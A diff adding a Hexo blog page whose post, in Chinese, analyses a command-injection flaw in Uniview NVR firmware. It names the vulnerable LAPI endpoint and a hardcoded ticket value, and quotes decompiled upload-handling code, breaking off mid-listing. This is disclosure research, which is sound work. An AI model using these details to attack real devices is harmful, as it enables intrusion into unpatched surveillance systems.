@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Zhiyuan">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/07/29/uniview-nvr-rce/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Uniview NVR command injection">
+<meta property="og:url" content="http://example.com/2024/07/29/Uniview-NVR-RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2024-07-29T13:43:43.000Z">
+<meta property="article:modified_time" content="2025-05-16T14:33:14.993Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="IoT">
+<meta property="article:tag" content="Vulnerability">
+<meta property="article:tag" content="Uniview">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/log2.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/log2.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/log2.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Uniview NVR command injection | Zhi0Yuan Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/drak.png"},"title":"兴趣是坚持和耐心的源泉","subtitle":{"text":["Zhi0Yuan","独立安全研究员","Never Fade Away"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Zhi0Yuan","instagram":null,"zhihu":null,"twitter":"https://x.com/Zeroved0x5A","email":"czhi540@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/log.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Zhi0Yuan Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Uniview NVR command injection</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/log.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Zhiyuan</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-07-29 21:43:43</span>
+        <span class="mobile">2024-07-29 21:43:43</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-16 22:33:14</span>
+            <span class="mobile">2025-05-16 22:33:14</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/My-Vulnerability/">My Vulnerability</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IoT/">IoT</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Vulnerability/">Vulnerability</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Uniview/">Uniview</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>NVR301Q_General-B3503.10.10.210426</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在新版中该漏洞已修复</p>
+<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>在这个版本中的main-cgi程序中,存在一个特殊的票据<code>dcf0ef5d8f3fc7ee2733685c7debc953</code>，但并不意味着可以绕过认证，类似硬编码的票据。</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (iVar7 == <span class="number">0</span> || (iVar6 == <span class="number">0</span> || (iVar5 == <span class="number">0</span> || (iVar4 == <span class="number">0</span> || iVar3 == <span class="number">0</span>)))) &#123;</span><br><span class="line">    uVar17 = <span class="number">0xea66</span>;</span><br><span class="line">    pcVar18 = <span class="string">&quot;Web request param is error, Error code = %d&quot;</span>;</span><br><span class="line">    uVar11 = <span class="number">0x4f0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LAB_000bf834;</span><br><span class="line">  &#125;</span><br><span class="line">  bVar1 = iVar8 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (bVar1) &#123;</span><br><span class="line">    local_78 = <span class="number">0</span>;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    local_78 = data_json_value(param_1,&amp;DAT_000f15f0);</span><br><span class="line">    local_74 = data_json_value(param_1,<span class="string">&quot;cnonce&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (local_74 == <span class="number">0</span> || local_78 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar17 = <span class="number">0xea66</span>;</span><br><span class="line">      pcVar18 = <span class="string">&quot;Web request param is error, Error code = %d&quot;</span>;</span><br><span class="line">      uVar11 = <span class="number">0x4f9</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_000bf834;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar9 = strncasecmp(*(<span class="type">char</span> **)(iVar7 + <span class="number">0x10</span>),<span class="string">&quot;dcf0ef5d8f3fc7ee2733685c7debc953&quot;</span>,<span class="number">0x20</span>);<span class="comment">//对比response是否相同</span></span><br><span class="line">  <span class="keyword">if</span> (iVar9 == <span class="number">0</span>) &#123;</span><br><span class="line">LAB_000bf7e4:</span><br><span class="line">    puVar10 = *(undefined4 **)(iVar4 + <span class="number">0x10</span>);</span><br><span class="line">LAB_000bf804:</span><br><span class="line">    uVar11 = FUN_000dc4a0(puVar10);</span><br><span class="line">    FUN_000dc150(param_1,<span class="string">&quot;loginHandle&quot;</span>,uVar11);</span><br></pre></td></tr></table></figure></div>
+
+<p>而我们的存在漏洞的url是<code>/LAPI/V1.0/PTZ/CustomProtocal/Configuration</code></p>
+<p>根据字符串定位到处理URL的函数<code>FUN_0009c350</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FUN_0009c350</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  local_118 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;local_84,<span class="number">0</span>,<span class="number">0x74</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack_e4,<span class="number">0</span>,<span class="number">0x60</span>);</span><br><span class="line">  iVar1 = FUN_000d9898(&amp;DAT_000e17bc,<span class="number">0x200000</span>,&amp;local_114); <span class="comment">//这里存在命令执行</span></span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    BP_WriteLog(<span class="number">4</span>,<span class="number">1</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_lapi_ptz.c&quot;</span>,<span class="number">0xa18</span>,<span class="string">&quot;LAPI_PTZ_Post_CustomProtocal_Configuration&quot;</span>,</span><br><span class="line">                <span class="string">&quot;LAPI read file stream error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(acStack_e4,<span class="number">0x60</span>,<span class="string">&quot;%s/%s&quot;</span>,&amp;DAT_000e17bc,&amp;local_114);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>接下来跟入<code>FUN_000d9898</code>函数</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_000d9898</span><span class="params">(<span class="type">int</span> param_1,<span class="type">int</span> param_2,<span class="type">char</span> *param_3)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">    ...</span><br><span class="line">  <span class="type">char</span> acStack_a8 [<span class="number">132</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(acStack_1a8,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack_128,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack_a8,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="keyword">if</span> (param_3 == (<span class="type">char</span> *)<span class="number">0x0</span> || param_1 == <span class="number">0</span>) &#123;</span><br><span class="line">    pcVar1 = <span class="string">&quot;Func para is null&quot;</span>;</span><br><span class="line">    uVar9 = <span class="number">0x11a0</span>;</span><br><span class="line">LAB_000d99f0:</span><br><span class="line">    BP_WriteLog(<span class="number">4</span>,<span class="number">1</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,uVar9,<span class="string">&quot;LAPI_COMMON_GET_Upload_FileFromExtern&quot;</span>,pcVar1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pcVar1 = getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>); <span class="comment">//获取环境变量</span></span><br><span class="line">  <span class="keyword">if</span> (pcVar1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    pcVar1 = <span class="string">&quot;Content-Type is not found.&quot;</span>;</span><br><span class="line">    uVar9 = <span class="number">0x11ab</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pcVar2 = <span class="built_in">strstr</span>(pcVar1,<span class="string">&quot;boundary=&quot;</span>); <span class="comment">//判断boundary是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      pcVar1 = <span class="string">&quot;NO find the Boundary.&quot;</span>;</span><br><span class="line">      uVar9 = <span class="number">0x11b3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      pcVar1 = strtok(pcVar1,<span class="string">&quot;=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (pcVar1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        pcVar1 = <span class="string">&quot;Content-Type is not correct.&quot;</span>;</span><br><span class="line">        uVar9 = <span class="number">0x11ba</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        pcVar1 = strtok((<span class="type">char</span> *)<span class="number">0x0</span>,<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pcVar1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          pcVar1 = <span class="string">&quot;stream boundary is NULL&quot;</span>;</span><br><span class="line">          uVar9 = <span class="number">0x129b</span>;</span><br><span class="line">          <span class="keyword">goto</span> LAB_000d99f0;</span><br><span class="line">        &#125;</span><br><span class="line">        pcVar2 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>); <span class="comment">//获取length</span></span><br><span class="line">        <span class="keyword">if</span> (pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          pcVar1 = <span class="string">&quot;CONTENT_LENGTH is NULL.&quot;</span>;</span><br><span class="line">          uVar9 = <span class="number">0x11c4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          sVar3 = atol(pcVar2);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">int</span>)sVar3 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            pcVar1 = <span class="string">&quot;File Size is 0 Byte.&quot;</span>;</span><br><span class="line">            uVar9 = <span class="number">0x11cd</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">int</span>)sVar3 &lt;= param_2) &#123;</span><br><span class="line">              <span class="keyword">if</span> (<span class="number">0xfffff</span> &lt; (<span class="type">int</span>)sVar3) &#123;</span><br><span class="line">                pcVar2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">                sVar10 = <span class="number">0x100000</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                pcVar2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(sVar3 + <span class="number">1</span>);</span><br><span class="line">                sVar10 = sVar3;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (pcVar2 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                BP_WriteLog(<span class="number">4</span>,<span class="number">1</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x11e5</span>,</span><br><span class="line">                          ...</span><br><span class="line">              pcVar5 = <span class="built_in">strstr</span>(pcVar2,pcVar1);</span><br><span class="line">              <span class="keyword">if</span> ((pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) || ((<span class="type">int</span>)pcVar5 - (<span class="type">int</span>)pcVar2 &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                uVar9 = <span class="number">0x11f2</span>;</span><br><span class="line">                pcVar1 = <span class="string">&quot;Failed to find the Boundary&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span> &#123;</span><br><span class="line">                sVar4 = <span class="built_in">strlen</span>(pcVar1);</span><br><span class="line">                iVar7 = ((<span class="type">int</span>)pcVar5 - (<span class="type">int</span>)pcVar2) + <span class="number">2</span> + sVar4;</span><br><span class="line">                pcVar5 = <span class="built_in">strstr</span>(pcVar2 + iVar7,<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> ((pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) ||</span><br><span class="line">                   (iVar8 = (<span class="type">int</span>)pcVar5 - (<span class="type">int</span>)(pcVar2 + iVar7), iVar8 &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                  uVar9 = <span class="number">0x11fc</span>;</span><br><span class="line">                  pcVar1 = <span class="string">&quot;Failed to find the \\r\\n after Content-Disposition.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                  pcVar5 = <span class="built_in">strstr</span>(pcVar2,<span class="string">&quot;Content-Disposition&quot;</span>);<span class="comment">//判断Content-Disposition</span></span><br><span class="line">                  <span class="keyword">if</span> (pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                    uVar9 = <span class="number">0x1205</span>;</span><br><span class="line">                    pcVar1 = <span class="string">&quot;find Content-Disposition Failed.&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span> &#123;</span><br><span class="line">                    BP_WriteLog(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x120a</span>,</span><br><span class="line">                                <span class="string">&quot;LAPI_COMMON_GET_Upload_FileFromExtern&quot;</span>,<span class="string">&quot;Content-Disposition: [%s]&quot;</span>,</span><br><span class="line">                                pcVar5);</span><br><span class="line">                    pcVar6 = pcVar5;</span><br><span class="line">                    BP_WriteLog(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x115d</span>,</span><br><span class="line">                                <span class="string">&quot;CGI_COMMON_Get_FileNameFromContent_Disposition&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;Param pcContentDisp = [%s].&quot;</span>,pcVar5);</span><br><span class="line">                    pcVar5 = <span class="built_in">strstr</span>(pcVar5,<span class="string">&quot;filename=&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123; <span class="comment">//这里判断filename是否为空</span></span><br><span class="line">                      BP_WriteLog(<span class="number">4</span>,<span 